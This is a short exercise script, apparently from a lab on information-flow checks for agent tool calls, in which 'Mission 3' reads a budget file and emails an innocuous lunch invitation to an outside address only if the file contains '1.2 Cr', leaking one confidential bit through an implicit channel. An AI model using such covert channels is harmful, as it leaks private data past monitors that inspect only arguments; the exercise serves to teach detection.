# Mission 3: leak ONE bit of the budget without putting it in any argument.
# Bob learns whether the budget is 1.2 Cr just by getting (or not getting) mail.
# Run it twice: as is (STRICT), then with --normal. Which mode catches it, and why?
budget = read_file("budget-2026.xlsx")
if "1.2 Cr" in budget:
    send_email(to="bob@partner.example", subject="Lunch?", body="Lunch on Friday?")
